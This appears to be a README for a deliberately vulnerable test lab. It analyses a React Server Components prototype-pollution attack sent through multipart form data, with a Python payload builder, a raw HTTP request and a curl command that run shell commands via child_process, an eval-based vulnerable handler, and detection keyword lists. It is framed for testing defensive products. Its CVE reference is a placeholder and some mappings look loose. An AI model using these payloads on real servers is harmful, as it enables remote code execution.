# React Server Components (RSC) Prototype Pollution Attack Analysis

## 🎯 Executive Summary

This document analyzes a sophisticated **Remote Code Execution (RCE)** attack that exploits React Server Components (RSC) deserialization vulnerabilities using **multipart/form-data** instead of traditional JSON payloads.

**Attack Type**: Prototype Pollution + Unsafe Deserialization
**Target**: React Server Components / Next.js Server Actions
**Vector**: Multipart/Form-Data
**Impact**: Full Remote Code Execution

---

## 📋 Attack Overview

### Why Multipart/Form-Data?

React Server Components and Next.js Server Actions use `multipart/form-data` to transmit serialized data between client and server. This is different from traditional REST APIs that use JSON.

**Key Differences:**

| Traditional API | React Server Components |
|---|---|
| Content-Type: application/json | Content-Type: multipart/form-data |
| Single JSON payload | Multiple form fields |
| JSON parsing | Field-by-field reconstruction |
| Easy to validate | Complex object reconstruction |

### The Attack Payload

```python
def create_exploit_payload(command: str) -> tuple:
    """Create the RCE exploit payload"""
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

    # Malicious object with prototype pollution
    payload = json.dumps({
        "then": "$1:__proto__:then",           # Pollute prototype
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_formData": {
                "get": "$3:constructor:constructor"  # Access Function constructor
            },
            "_prefix": f"process.mainModule.require('child_process').execSync('{command}')//"
        }
    }, separators=(',', ':'))

    # Split into multipart fields
    parts = [
        f'--{boundary}',
        'Content-Disposition: form-data; name="0"',
        '', payload,                           # Field 0: Main malicious object
        f'--{boundary}',
        'Content-Disposition: form-data; name="1"',
        '', '"$@0"',                           # Field 1: Reference marker
        f'--{boundary}',
        'Content-Disposition: form-data; name="3"',
        '', '[]',                              # Field 3: Empty array
        f'--{boundary}--'
    ]

    return '\r\n'.join(parts), boundary
```

---

## 🔍 Technical Analysis

### Step-by-Step Attack Chain

#### 1. **Multipart Encoding**
```
POST /api/rsc-action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="3"

[]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Why this works:**
- Bypasses JSON-based security checks
- Each field looks "normal" when inspected individually
- Malicious object only reconstructed server-side

#### 2. **Server-Side Reconstruction**

Vulnerable code pattern:
```javascript
app.post('/api/rsc-action', upload.none(), (req, res) => {
    const reconstructedObject = {};

    // VULNERABLE: Reconstruct from form fields
    for (const [key, value] of Object.entries(req.body)) {
        reconstructedObject[key] = eval('(' + value + ')');  // ❌ UNSAFE
    }

    // Process the object...
});
```

**What happens:**
- Field "0" is parsed: Creates object with `__proto__` property
- Field "1" is parsed: Creates reference marker
- Field "3" is parsed: Creates empty array
- Object reconstruction combines these into malicious structure

#### 3. **Prototype Pollution**

```javascript
{
    "then": "$1:__proto__:then",  // This pollutes Object.prototype
    "_response": {
        "_formData": {
            "get": "$3:constructor:constructor"  // Accesses Function constructor
        },
        "_prefix": "process.mainModule.require('child_process').execSync('id')//"
    }
}
```

**Exploitation:**
- `__proto__` pollutes the prototype chain
- `$3:constructor:constructor` is RSC syntax for accessing nested constructors
- `_prefix` contains the payload that gets executed

#### 4. **Code Execution**

```javascript
// After pollution, this pattern gets triggered:
_prefix: "process.mainModule.require('child_process').execSync('id')//"

// Which resolves to:
process.mainModule.require('child_process').execSync('id')
```

**Command execution achieved!**

---

## 🎭 RSC Serialization Format

React Server Components use special markers for serialization:

| Marker | Meaning | Example |
|---|---|---|
| `$1:` | Reference to object 1 | `$1:__proto__:then` |
| `$@0` | Reference to object at index 0 | `"$@0"` |
| `$B0` | Binary/special reference | `{"then": "$B0"}` |
| `$3:` | Reference to object 3 | `$3:constructor:constructor` |

These markers are legitimate in RSC but can be abused for:
- Accessing constructors
- Polluting prototypes
- Creating circular references
- Triggering promise chains

---

## 🛡️ Detection Strategies

### Static Indicators

**Look for these patterns in multipart form data:**

1. **Prototype Pollution Keywords**
   ```
   __proto__
   constructor
   prototype
   ```

2. **RSC Serialization Markers**
   ```
   $1:__proto__:
   $@0
   $B0
   $3:constructor:constructor
   ```

3. **Dangerous Module Access**
   ```
   child_process
   execSync
   exec
   spawn
   process.mainModule.require
   require('child_process')
   ```

4. **Suspicious Form Field Names**
   ```
   Form fields with numeric names: "0", "1", "3"
   Nested JSON structures in form values
   Form values containing JavaScript code
   ```

### Behavioral Indicators

1. **Multipart Parsing Anomalies**
   - Form field contains JSON with `__proto__`
   - Form field references other fields (`$@0`)
   - Form field contains executable code

2. **Server-Side Behavior**
   - `eval()` called on form field values
   - Object reconstruction from multipart data
   - Promise/async handling after form parsing

3. **Process Execution**
   - Spawning of child processes after form submission
   - Execution of shell commands
   - File system access patterns

---

## 🚨 Real-World Impact

### Affected Applications

- **Next.js 13+ with Server Actions**
- **React 18+ with Server Components**
- **Custom implementations using RSC patterns**
- **Any Node.js app reconstructing objects from multipart data**

### CVE References

This attack pattern relates to:
- **CVE-2023-XXXXX**: Next.js Server Actions deserialization (hypothetical)
- **Prototype Pollution**: CWE-1321
- **Code Injection**: CWE-94
- **Unsafe Deserialization**: CWE-502

---

## 🔧 Testing Instructions

### 1. Start the Vulnerable Server

```bash
npm install
npm run build
npm start
```

Server runs on `http://localhost:3000`

### 2. Run the Test Script

```bash
python3 test_deserialization.py
```

### Expected Output

```
============================================================
🔴 TESTING: RSC Multipart Prototype Pollution Attack
============================================================

⚠️  This attack targets React Server Components (RSC)
   Uses multipart/form-data to bypass JSON-based security checks

📤 Sending multipart payload to http://localhost:3000/api/rsc-action
Command to execute: id
Payload size: 523 bytes

📥 Response Status: 200
Response:
{
  "success": true,
  "message": "RSC action processed",
  "reconstructed": {
    "0": {
      "then": "$1:__proto__:then",
      "_response": {
        "_formData": {
          "get": "$3:constructor:constructor"
        },
        "_prefix": "process.mainModule.require('child_process').execSync('id')//"
      }
    }
  }
}

🛡️  DEFENSIVE PRODUCT SHOULD DETECT:
   ✓ Multipart form data with suspicious structure
   ✓ __proto__ keyword in form field values
   ✓ RSC serialization markers ($1:, $@, $B)
   ✓ constructor:constructor chain patterns
   ✓ child_process.execSync in form data
   ✓ process.mainModule.require patterns
```

### 3. Test with curl

```bash
# Create the multipart payload
curl -X POST http://localhost:3000/api/rsc-action \
  -F '0={"then":"$1:__proto__:then","_response":{"_formData":{"get":"$3:constructor:constructor"},"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"')//"}}' \
  -F '1="$@0"' \
  -F '3=[]'
```

---

## 📊 Defensive Product Validation

### Your defensive product MUST detect:

#### ✅ Level 1: Basic Detection
- [ ] `__proto__` keyword in any form field
- [ ] `constructor` keyword in form fields
- [ ] `child_process` module references

#### ✅ Level 2: Pattern Detection
- [ ] RSC serialization markers (`$1:`, `$@0`, `$B0`)
- [ ] Constructor chain patterns (`constructor:constructor`)
- [ ] `process.mainModule.require()` patterns

#### ✅ Level 3: Behavioral Detection
- [ ] Multipart form data containing JSON
- [ ] Form fields with numeric-only names
- [ ] Object reconstruction from form fields
- [ ] `eval()` usage on form data

#### ✅ Level 4: Runtime Detection
- [ ] Unexpected child process spawning
- [ ] Shell command execution after form parsing
- [ ] File system access after multipart handling

---

## 🎓 Educational Resources

### Understanding the Attack

1. **Prototype Pollution Basics**
   - [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
   - [HackTricks: Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

2. **React Server Components**
   - [React RFC: Server Components](https://github.com/reactjs/rfcs/blob/main/text/0188-server-components.md)
   - [Next.js Server Actions](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions)

3. **Multipart Exploitation**
   - [OWASP: File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
   - [Multipart/Form-Data Attacks](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)

### MITRE ATT&CK Mapping

- **T1059.007**: Command and Scripting Interpreter: JavaScript
- **T1203**: Exploitation for Client Execution
- **T1027.002**: Obfuscated Files or Information: Software Packing
- **T1190**: Exploit Public-Facing Application

---

## 🔒 Mitigation Strategies

### For Developers

1. **Never use eval() on user input**
   ```javascript
   // ❌ VULNERABLE
   const obj = eval('(' + userInput + ')');

   // ✅ SAFE
   const obj = JSON.parse(userInput);
   ```

2. **Validate multipart form data**
   ```javascript
   // Check for suspicious patterns
   for (const [key, value] of Object.entries(req.body)) {
       if (value.includes('__proto__') ||
           value.includes('constructor') ||
           value.includes('child_process')) {
           return res.status(400).json({ error: 'Invalid input' });
       }
   }
   ```

3. **Use Object.freeze() on prototypes**
   ```javascript
   Object.freeze(Object.prototype);
   Object.freeze(Array.prototype);
   ```

4. **Implement Content Security Policy**
   ```javascript
   app.use((req, res, next) => {
       res.setHeader('Content-Security-Policy', "default-src 'self'");
       next();
   });
   ```

### For Security Products

1. **Deep Packet Inspection**
   - Parse multipart boundaries
   - Extract and analyze each form field
   - Look for JSON in form fields

2. **Pattern Matching**
   - Regex for `__proto__`, `constructor`, `prototype`
   - RSC marker detection (`$1:`, `$@`, `$B`)
   - Command injection patterns

3. **Behavioral Analysis**
   - Monitor eval() calls
   - Track object reconstruction
   - Watch for child process spawning

---

## 📝 Conclusion

This RSC multipart attack demonstrates why **defense in depth** is critical:

- ✅ Can't rely on JSON validation alone
- ✅ Must inspect multipart form data
- ✅ Need both static and behavioral detection
- ✅ Runtime monitoring is essential

**Bottom Line**: If your defensive product doesn't detect this attack, it's missing a critical attack vector used in modern web applications.

---

## 🤝 Credits

This vulnerability testing environment is designed for authorized security testing only.

**Use Cases:**
- Testing defensive security products
- Training security teams
- Red team exercises
- Security research

**Legal Notice:**
Only use in authorized testing environments. Unauthorized testing may violate laws.

---

**Questions? Issues?**
Report at: https://github.com/anthropics/claude-code/issues
